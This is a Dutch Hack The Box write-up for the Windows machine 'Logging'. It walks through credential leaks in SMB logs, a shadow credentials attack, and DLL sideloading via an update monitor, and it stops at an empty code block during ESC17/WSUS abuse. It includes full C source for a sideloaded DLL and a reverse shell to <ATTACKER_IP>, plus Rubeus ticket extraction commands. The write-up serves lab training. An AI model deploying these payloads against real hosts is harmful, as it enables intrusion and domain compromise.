---
title: Logging
date: 2026-08-05
platform: Hack The Box
os: Windows
difficulty: Medium
lang: "nl"
permalink: /nl/writeups/logging/
alt_url: "/writeups/logging/"
tags:
  - logging
  - kerberos
  - esc17
  - ESC17
  - wsus
  - active-directory
  - adcs
  - bloodyAD
  - wsuks
  - certipy
  - sideloading
  - dll
  - hackthebox
  - htb
  - netexec
summary: Een Windows-domeincontroller waarbij gelekte logs de credentials van een serviceaccount verraden, een shadow credentials-aanval een foothold oplevert, en ESC17/WSUS-misbruik plus DLL-sideloading ons naar Domain Admin brengt.
logo: /assets/img/writeups/logging/logging.png
---

## Overzicht

Deze machine vond ik best pittig voor een Medium-box, vooral omdat een aantal tools nieuw voor me was en ik goed moest letten op de payload-code om hem echt geschikt te maken voor DLL-sideloading. Het voordeel is dat ik er veel van heb geleerd.

## Verkenning

Voordat ik de machine start, laat HTB dit zien:

#### Machine-informatie

Zoals bij echte pentests gebruikelijk is, begin je de Logging-box met credentials voor het volgende account: `wallace.everette` / `Welcome2026@`

Het eerste dat me opvalt is de machinenaam `logging`. Dat doet me denken dat het pad naar log-injectie wijst of iets in die richting. Laten we eerst kijken welke poorten open staan.

```bash
nmap -sV -sC 10.129.45.103
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-05 21:15 CEST
Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.29% done; ETC: 21:15 (0:00:00 remaining)
Nmap scan report for 10.129.45.103
Host is up (0.0059s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-06 02:15:18Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging
| Not valid before: 2026-04-24T16:40:59
|_Not valid after:  2106-04-24T16:40:59
445/tcp    open  microsoft-ds?
464/tcp    open  kpasswd5?
593/tcp    open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp    open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
3268/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
3269/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)
5985/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
<SNIP - repeated ssl-cert / ldap entries omitted>
Host script results:
| smb2-time:
|   date: 2026-08-06T02:15:59
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m01s, deviation: 0s, median: 7h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.55 seconds
```

Hieruit kan ik opmaken dat het een Windows-domeincontroller is met de naam `DC01.logging.htb` voor het domein `logging.htb`. Er zit ook een tijdsverschil van 7 uur tussen mijn machine en deze server, wat vooral met Kerberos een probleem kan zijn.

Voor nu: de servernaam en domeinnaam toevoegen aan het hosts-bestand.

```bash
echo "10.129.45.103  DC01.logging.htb logging.htb" | sudo tee -a /etc/hosts
```

En de tijd synchroniseren met de server.

```bash
sudo ntpdate -s dc01.logging.htb
```

`NetExec` vertelt ons dat we leesrechten hebben op de share `Logs`. Bedenk dat de machine logging heette.

```bash
nxc smb dc01.logging.htb -u wallace.everette -d logging.htb --dns-server 10.129.45.103 -p 'Welcome2026@' --shares
SMB  10.129.45.103  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.45.103  445  DC01  [+] logging.htb\wallace.everette:Welcome2026@
SMB  10.129.45.103  445  DC01  [*] Enumerated shares
SMB  10.129.45.103  445  DC01  Share  Permissions  Remark
SMB  10.129.45.103  445  DC01  -----  -----------  ------
SMB  10.129.45.103  445  DC01  ADMIN$            Remote Admin
SMB  10.129.45.103  445  DC01  C$                Default share
SMB  10.129.45.103  445  DC01  IPC$   READ       Remote IPC
SMB  10.129.45.103  445  DC01  Logs   READ
SMB  10.129.45.103  445  DC01  NETLOGON  READ    Logon server share
SMB  10.129.45.103  445  DC01  SYSVOL    READ    Logon server share
SMB  10.129.45.103  445  DC01  WSUSTemp          A network share used by Local Publishing from a Remote WSUS Console Instance.
```

## Voet aan de grond

Laten we kijken wat er op de share staat.

```bash
smbclient -U  wallace.everette%'Welcome2026@' '//logging.htb/Logs'
Try "help" to get a list of possible commands.
smb: \> ls
.                                    D        0  Fri Apr 17 01:10:09 2026
..                                   D        0  Fri Apr 17 01:10:09 2026
Audit_Heartbeat.log                  A     1294  Fri Apr 17 01:10:09 2026
IdentitySync_Trace_20260219.log      A     8488  Fri Apr 17 01:10:09 2026
Service_State.log                    A      468  Fri Apr 17 01:10:09 2026
TaskMonitor.log                      A     1170  Fri Apr 17 01:10:09 2026

6657279 blocks of size 4096. 1831265 blocks available
smb: \> mget *.*
Get file Audit_Heartbeat.log? y
Get file IdentitySync_Trace_20260219.log? y
Get file Service_State.log? y
Get file TaskMonitor.log? y
```

Vrij verrassend: het zijn allemaal logbestanden. De boxnaam suggereert dat hier iets interessants in zit, dus ik download ze. Eens kijken of er iets van belang tussen staat.

```bash
cat *.log
<SNIP - repetitive HEARTBEAT / threadpool lines omitted>
[2026-02-09 03:00:01.470] [PID:4102] [Thread:12] INFO  - Initializing module [HR-Connector]...
[2026-02-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0
[2026-02-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).
[2026-02-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)
[2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...
[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "<REDACTED>", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
at logging.IdentitySync.Engine.LdapProvider.Connect()
--- Server Error Details ---
Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
Win32 Error: 49 (Invalid Credentials)
<SNIP - remaining heartbeat / trace noise omitted>
```

Eén regel in de log valt me op. In de logs zie je een poging om in te loggen met de gebruiker `svc_recovery`, maar die mislukt door een verkeerd wachtwoord. Laten we dat verifiëren met nxc.

```bash
nxc smb dc01.logging.htb -u "logging\svc_recovery" --dns-server 10.129.45.103 -p '<REDACTED>'
SMB  10.129.45.103  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.45.103  445  DC01  [-] logging\svc_recovery:<REDACTED> STATUS_ACCOUNT_RESTRICTION
```

`STATUS_ACCOUNT_RESTRICTION`. En nu? SMB-logon wordt geblokkeerd. Als het wachtwoord verkeerd was geweest, kreeg je een andere fout — `STATUS_LOGON_FAILURE` — zoals hieronder te zien is. Ter vergelijking: als we ons startaccount `wallace.everette` proberen met het verkeerde jaar in het wachtwoord (hier `2025` in plaats van `2026`), krijgen we precies die `STATUS_LOGON_FAILURE`.

```bash
nxc smb dc01.logging.htb -u wallace.everette -d logging.htb --dns-server 10.129.45.103 -p 'Welcome2025@'
SMB  10.129.45.103  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.45.103  445  DC01  [-] logging.htb\wallace.everette:Welcome2025@ STATUS_LOGON_FAILURE
```

#### Kerberos

nxc werkt niet lekker met ldaps, maar er zijn meer wegen naar Rome. Laten we kijken of we een Kerberos-ticket kunnen krijgen.

De gelekte log laat zien dat het wachtwoord van `svc_recovery` `<REDACTED>` is (let op: de waarde in de log gebruikt het jaar **2025** en de bind mislukt). Dat is onze eerste aanwijzing over hoe deze organisatie met wachtwoorden omgaat.

```bash
# First attempt: the leaked password from the log uses the previous year (2025) -> pre-auth fails
impacket-getTGT logging.htb/svc_recovery:'<REDACTED>' -dc-ip 10.129.45.103 -debug
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Trying to connect to KDC at 10.129.45.103:88
[+] Trying to connect to KDC at 10.129.45.103:88
[+] Server time (UTC): 2026-08-06 03:11:21
Traceback (most recent call last):
  File "/usr/share/doc/python3-impacket/examples/getTGT.py", line 131, in <module>
    executer.run()
    ~~~~~~~~~~~~^^
  File "/usr/share/doc/python3-impacket/examples/getTGT.py", line 61, in run
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName = userName,
                                                      password = self.__password,
                                                      kdcHost = self.__kdcHost,
                                                      serverName = self.__service)
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 323, in getKerberosTGT
    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
          ~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

De volgende stap is vrij duidelijk zodra je het patroon ziet. De box en zijn logs zijn uit 2026, en ons startaccount `wallace.everette` gebruikt het wachtwoord `Welcome2026@` — een wachtwoord opgebouwd uit het woord "Welcome" plus het huidige jaar. Het patroon "Welcome" + jaar betekent dat de organisatie het jaar in haar wachtwoorden ophoogt. Als gebruikersaccounts dat doen, doen serviceaccounts het waarschijnlijk ook: het gelekte wachtwoord van `svc_recovery` gebruikt **2025**, dus we schuiven het simpelweg door naar **2026**.

#### Bingo

```bash
# Bingo: increment the year in the service-account password to 2026 and the KDC issues a TGT
impacket-getTGT logging.htb/svc_recovery:'<REDACTED>' -dc-ip 10.129.45.103 -debug
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[+] Trying to connect to KDC at 10.129.45.103:88
[+] Trying to connect to KDC at 10.129.45.103:88
[*] Saving ticket in svc_recovery.ccache
```

Ticket binnen. Zet de `KRB5CCNAME`-variabele die we voor authenticatie nodig hebben.

```bash
export KRB5CCNAME=svc_recovery.ccache
```

Genereer ook een krb5.conf zodat hij de KDC-server kan vinden.

```bash
sudo nxc smb DC01.logging.htb -u wallace.everette -p 'Welcome2026@' --generate-krb5-file /etc/krb5.conf
SMB  10.129.45.103  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.45.103  445  DC01  [+] krb5 conf saved to: /etc/krb5.conf
SMB  10.129.45.103  445  DC01  [+] Run the following command to use the conf file: export KRB5_CONFIG=/etc/krb5.conf
SMB  10.129.45.103  445  DC01  [+] logging.htb\wallace.everette:Welcome2026@
```

#### BloodHound

Laten we kijken wat we kunnen doen.

```bash
nxc ldap 10.129.45.103 -u svc_recovery --dns-tcp -k --use-kcache -d logging.htb --dns-server 10.129.45.103 --dns-tcp --bloodhound
LDAP  10.129.45.103  389  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)
LDAP  10.129.45.103  389  DC01  [+] logging.htb\svc_recovery from ccache
LDAP  10.129.45.103  389  DC01  Resolved collection methods: adcs, group, localadmin, session, trusts
LDAP  10.129.45.103  389  DC01  Excluded collection methods: acl, container, dcom, loggedon, objectprops, psremote, rdp
LDAP  10.129.45.103  389  DC01  Using kerberos auth from ccache
LDAP  10.129.45.103  389  DC01  Bloodhound data collection completed in 0M 1S
LDAP  10.129.45.103  389  DC01  Collecting ADCS data (CertiHound)...
LDAP  10.129.45.103  389  DC01  Found 34 certificate templates
LDAP  10.129.45.103  389  DC01  Found 1 Enterprise CAs
LDAP  10.129.45.103  389  DC01  Compressing output into /home/henk/.nxc/logs/DC01_10.129.45.103_2026-08-06_053208_bloodhound.zip
```

```bash
cp /home/henk/.nxc/logs/DC01_10.129.45.103_2026-08-06_053208_bloodhound.zip .
```

Ik kijk altijd wie er op afstand kan inloggen — wie lid is van Remote Management Users of Remote Desktop Users. Met `svc_recovery` zie ik nog niet veel interessants om te doen.

![BloodHound - MSA_HEALTH$ is lid van Remote Management Users](/assets/img/writeups/logging/bloodhound_msa_health.png)

Omdat BloodHound niet altijd alles laat zien, loont het meer dan één tool te draaien. Met bloodyAD kunnen we zien op welke AD-objecten we schrijfrechten hebben.

```bash
bloodyAD -k ccache='svc_recovery.ccache' -d logging.htb --dc-ip 10.129.45.103 --host dc01.logging.htb get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=svc_recovery,CN=Users,DC=logging,DC=htb
permission: WRITE

distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
permission: WRITE

distinguishedName: DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD

distinguishedName: DC=_msdcs.logging.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=logging,DC=htb
permission: CREATE_CHILD
```

#### Tweede bingo

```bash
distinguishedName: CN=msa_health,CN=Managed Service Accounts,DC=logging,DC=htb
permission: WRITE
```

1. We hebben schrijfrechten op het serviceaccount `msa_health`. Dat opent allerlei deuren.
2. We hebben ook een ADCS-server.

```bash
nxc ldap 10.129.45.103 -u svc_recovery --dns-tcp -k --use-kcache -d logging.htb --dns-server 10.129.45.103 -M adcs
LDAP  10.129.45.103  389  DC01  [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:logging.htb) (signing:None) (channel binding:Never)
LDAP  10.129.45.103  389  DC01  [+] logging.htb\svc_recovery from ccache
ADCS  10.129.45.103  389  DC01  [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS  10.129.45.103  389  DC01  Found PKI Enrollment Server: DC01.logging.htb
ADCS  10.129.45.103  389  DC01  Found CN: logging-DC01-CA
```

### Shadow credentials-aanval

Met deze twee voorwaarden kunnen we een shadow credentials-aanval uitvoeren.

```bash
certipy shadow auto -u svc_recovery -k -no-pass -account 'msa_health$' -dc-ip 10.129.45.103 -dc-host dc01.logging.htb
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Targeting user 'msa_health$'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'f15e7e7491624629b8773b68738fc41b'
[*] Adding Key Credential with device ID 'f15e7e7491624629b8773b68738fc41b' to the Key Credentials for 'msa_health$'
[*] Successfully added Key Credential with device ID 'f15e7e7491624629b8773b68738fc41b' to the Key Credentials for 'msa_health$'
[*] Authenticating as 'msa_health$' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'msa_health$@logging.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'msa_health.ccache'
[*] Wrote credential cache to 'msa_health.ccache'
[*] Trying to retrieve NT hash for 'msa_health$'
[*] Restoring the old Key Credentials for 'msa_health$'
[*] Successfully restored the old Key Credentials for 'msa_health$'
[*] NT hash for 'msa_health$': <REDACTED>
```

```bash
evil-winrm-py -u 'msa_health$' -H <REDACTED> -i dc01.logging.htb
```

Onder andere zien we in de root van C: de mappen `Share` en `Wsus`.

```powershell
Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        4/16/2026   5:26 PM                inetpub
d-----        10/10/2020   8:38 AM                PerfLogs
d-r---        4/16/2026   6:40 PM                Program Files
d-----        4/10/2020   5:52 AM                Program Files (x86)
d-----        4/16/2026   4:10 PM                Share
d-r---        4/17/2026   1:47 PM                Users
d-----        4/16/2026   8:29 PM                Windows
d-----        4/16/2026   5:29 PM                Wsus
```

## DLL-sideloading

Tijdens het rondkijken vond ik dit in een log:

```windows
type C:\ProgramData\UpdateMonitor\Logs\monitor.log
```

```text
[2026-08-05 21:26:15] Starting Sentinel Update Check...
[2026-08-05 21:26:15] Checking for update on core server...
[2026-08-05 21:26:15] Info: Core did not find file Settings_Update.zip
[2026-08-05 21:26:15] Last status: File not found on core
[2026-08-05 21:26:15] Checking for update on local server...
[2026-08-05 21:26:15] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-08-05 21:26:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-08-05 21:26:15] Failed to load settings_update.dll. Error code: 126
[2026-08-05 21:26:15] Update check completed.
```

Het interessante deel: `settings_update.dll` bestaat niet. De eigenaar van het logbestand is `jaylee.clifton`.

```text
get-acl C:\ProgramData\UpdateMonitor\Logs\monitor.log | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\ProgramData\UpdateMonitor\Logs\monitor.log
Owner  : logging\jaylee.clifton
Group  : logging\Domain Users
Access : NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
logging\jaylee.clifton Allow  FullControl
BUILTIN\Users Allow  ReadAndExecute, Synchronize
```

We hebben ook schrijfrechten op de map `C:\ProgramData\UpdateMonitor`.

```text
C:\Users\msa_health$> get-acl C:\ProgramData\UpdateMonitor\ | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\ProgramData\UpdateMonitor\
Owner  : BUILTIN\Administrators
Group  : logging\Domain Users
Access : NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
CREATOR OWNER Allow  268435456
BUILTIN\Users Allow  ReadAndExecute, Synchronize
BUILTIN\Users Allow  Write
```

We hebben geen toegang tot het pad waar de dll staat.

```text
C:\Users\msa_health$> get-acl "C:\Program Files\UpdateMonitor\bin" | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files\UpdateMonitor\bin
Owner  : BUILTIN\Administrators
Group  : logging\Domain Users
Access : logging\IT Allow  FullControl
NT SERVICE\TrustedInstaller Allow  FullControl
NT AUTHORITY\SYSTEM Allow  FullControl
BUILTIN\Administrators Allow  FullControl
BUILTIN\Users Allow  ReadAndExecute, Synchronize
```

Als we nu een dll met een payload zippen, en de dll `settings_update.dll` noemen en het zipbestand `Settings_Update.zip`, werkt dat met een beetje geluk.

```c
// sideload_payload.c
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Function that runs the payload in a separate thread
DWORD WINAPI PayloadThread(LPVOID lpParam) {
// 1) run whoami /all and redirect output to a file
STARTUPINFO si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
si.dwFlags = STARTF_USESHOWWINDOW;
si.wShowWindow = SW_HIDE;

char cmdLine[] = "cmd.exe /c whoami /all > C:\\share\\Logs\\test.txt";
if (CreateProcess(NULL, cmdLine, NULL, NULL, FALSE,
CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
WaitForSingleObject(pi.hProcess, INFINITE);
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}

// 2) adjust file permissions: give everyone read/write
char icaclsCmd[] = "icacls C:\\share\\Logs\\test.txt /grant Everyone:F /t";
system(icaclsCmd);

return 0;
}

// DllMain - starts the payload on attach
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call) {
case DLL_PROCESS_ATTACH:
// spawn a separate thread to avoid the loader lock
CreateThread(NULL, 0, PayloadThread, NULL, 0, NULL);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
```

```bash
i686-w64-mingw32-gcc -shared -o settings_update.dll payload.c -lws2_32
```

```bash
7z a Settings_Update.zip settings_update.dll

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
64-bit locale=nl_NL.UTF-8 Threads:24 OPEN_MAX:1024, ASM

Scanning the drive:
1 file, 80206 bytes (79 KiB)

Creating archive: Settings_Update.zip
Add new data to archive: 1 file, 80206 bytes (79 KiB)

Files read from disk: 1
Archive size: 28619 bytes (28 KiB)
Everything is Ok
```

```powershell
upload Settings_Update.zip .
Uploading /home/henk/htb/logging/Settings_Update.zip: 100%|██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 27.9k/27.9k [00:00<00:00, 656kB/s]
[+] File uploaded successfully as: C:\Users\msa_health$\Documents\Settings_Update.zip
```

We moeten de ACL van het bestand aanpassen zodat iedereen het kan lezen.

```powershell
$acl = get-acl .\Settings_Update.zip
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","Allow")
$acl.AddAccessRule($rule)
set-acl .\Settings_Update.zip $acl
move-item Settings_Update.zip C:\ProgramData\UpdateMonitor -force
```

Even wachten; volgens het logbestand draait de taak elke 3 minuten.

```text
[2026-08-06 17:26:15] Starting Sentinel Update Check...
[2026-08-06 17:26:15] Checking for update on core server...
[2026-08-06 17:26:15] Info: Core did not find file Settings_Update.zip
[2026-08-06 17:26:15] Last status: File not found on core
[2026-08-06 17:26:15] Checking for update on local server...
[2026-08-06 17:26:15] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
[2026-08-06 17:26:15] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-08-06 17:26:15] 'PreUpdateCheck' not found in settings_update.dll. Continuing...
[2026-08-06 17:26:15] Update check completed.
```

De log zegt dat hij de functie `PreUpdateCheck` niet kan vinden. Het commando wordt echter wel uitgevoerd.

```powershell
type c:\share\logs\test.txt

USER INFORMATION
----------------

User Name              SID
====================== ==============================================
logging\jaylee.clifton S-1-5-21-4020823815-2796529489-1682170552-2105

<SNIP>

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege    Add workstations to domain     Disabled
SeChangeNotifyPrivilege      Bypass traverse checking       Enabled
```

Laten we kijken of we een reverse shell kunnen krijgen.

```c
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32")

__declspec(dllexport) void PreUpdateCheck() {
WSADATA wsa;
WSAStartup(MAKEWORD(2,2), &wsa);

SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

struct sockaddr_in sa;
sa.sin_family = AF_INET;
sa.sin_port = htons(8182);
inet_pton(AF_INET, "<ATTACKER_IP>", &sa.sin_addr);

connect(s, (struct sockaddr*)&sa, sizeof(sa));

STARTUPINFOA si = {0};
si.cb = sizeof(si);
si.dwFlags = STARTF_USESTDHANDLES;
si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

PROCESS_INFORMATION pi = {0};
CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, INFINITE);
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
WSACleanup();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
return TRUE;
}
```

```bash
i686-w64-mingw32-gcc -shared -o settings_update.dll reverseshell.c -lws2_32
```

Dan nog een keer hetzelfde pad volgen.

```bash
7z a Settings_Update.zip settings_update.dll
```

```powershell
upload Settings_Update.zip .
$acl = get-acl .\Settings_Update.zip
$rule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone","FullControl","Allow")
$acl.AddAccessRule($rule)
set-acl .\Settings_Update.zip $acl
```

Start op je eigen Linux-box een netcat-listener.

```bash
rlwrap nc -nlvp 8182
```

Zet daarna de zip in de betreffende map op de Windows-box.

```powershell
move-item Settings_Update.zip C:\ProgramData\UpdateMonitor -force
```

Mooi, nu hebben we een shell.

```cmd
rlwrap nc -nlvp 8182
Listening on 0.0.0.0 8182
Connection received on 10.129.45.103 57998
Microsoft Windows [Version 10.0.17763.8644]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
logging\jaylee.clifton
```

```cmd
C:\Windows\System32>cd %USERPROFILE%\Desktop
C:\Users\jaylee.clifton\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is C007-7498

 Directory of C:\Users\jaylee.clifton\Desktop

04/16/2026  07:25 PM    <DIR>          .
04/16/2026  07:25 PM    <DIR>          ..
08/05/2026  07:01 PM                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,494,702,592 bytes free
```

## Privilege escalation

![BloodHound - JAYLEE.CLIFTON kan enrollen in de kwetsbare UPDATESRV-template (ESC17)](/assets/img/writeups/logging/bloodhound_esc17.png)

Wat kan Jaylee doen?

```text
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege    Add workstations to domain     Disabled
SeChangeNotifyPrivilege      Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

## ESC17

Laten we checken op kwetsbare certificaten. Start een snelle python-http-server voor de bestandsoverdracht.

```bash
python -m http.server 1337
```

En download Locksmith op Windows.

```cmd
curl http://<ATTACKER_IP>:1337/Invoke-Locksmith.ps1 -o Invoke-Locksmith.ps1
```

```powershell
powershell -Exec Bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\jaylee.clifton>
```

```text
.\Invoke-Locksmith.ps1
<SNIP - ASCII banner omitted>
-------------------------------------------------------------------------
ESC17 - Vulnerable Certificate Template - Server Authentication
-------------------------------------------------------------------------

Technique Template Name Risk   Enabled Issue
--------- ------------- ----   ------- -----
ESC17     UpdateSrv     Medium True    logging\IT can provide a Subject Alternative Name (SAN) while
enrolling in this Server Authentication template, and enrollment does not
require Manager Approval.

The resultant certificate can be used by an attacker to impersonate servers
and perform Machine-in-the-Middle Attacks

More info:
- https://trustedsec.com/blog/wsus-is-sus-ntlm-relay-attacks-in-plain-sight
- https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/
```

Het genoemde artikel gaat over de tool `wsuks`.

[WSUS is SUS: NTLM relay attacks in plain sight](https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/)

Die is te downloaden via:

[wsuks releases (v1.2.1)](https://github.com/NeffIsBack/wsuks/releases/tag/v1.2.1)

Volg eerst de installatie van wsuks. Nu moet ik vanaf Linux authenticeren. Laat me eerst een Kerberos-ticket pakken.

```powershell
curl http://<ATTACKER_IP>:1337/Rubeus.exe -o Rubeus.exe
```

```powershell
.\Rubeus.exe tgtdeleg /nowrap

______        _

_____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v2.3.3

[*] Action: Request Fake Delegation TGT (current user)
[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.logging.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: <REDACTED>
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):
<REDACTED>
```

Om de een of andere reden kan ik het ticket niet naar een bestand schrijven. Geen probleem — ik kopieer de output uit de browser en plak hem achter `echo -n`, zo:

```bash
echo -n <REDACTED> | base64 -d > ticket.kirbi
```

```bash
impacket-ticketConverter ticket.kirbi ticket.ccache
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
```

```bash
export KRB5CCNAME=ticket.ccache
klist
Ticket cache: FILE:ticket.ccache
Default principal: jaylee.clifton@LOGGING.HTB

Valid starting     Expires            Service principal
07-08-26 03:37:30  07-08-26 13:08:15  krbtgt/LOGGING.HTB@LOGGING.HTB
renew until 14-08-26 03:08:15
```

Op DC01 vertelt een reg query me de hostnaam van de wsus-server.

```powershell
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v WUServer

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    https://wsus.logging.htb:8531
```

Bij **stap 1** van [het genoemde digitrace-artikel](https://blog.digitrace.de/2026/01/using-adcs-to-attack-https-enabled-wsus-clients/) bevestigt de onderstaande sleutel dat Windows de wsus-server gebruikt.

```powershell
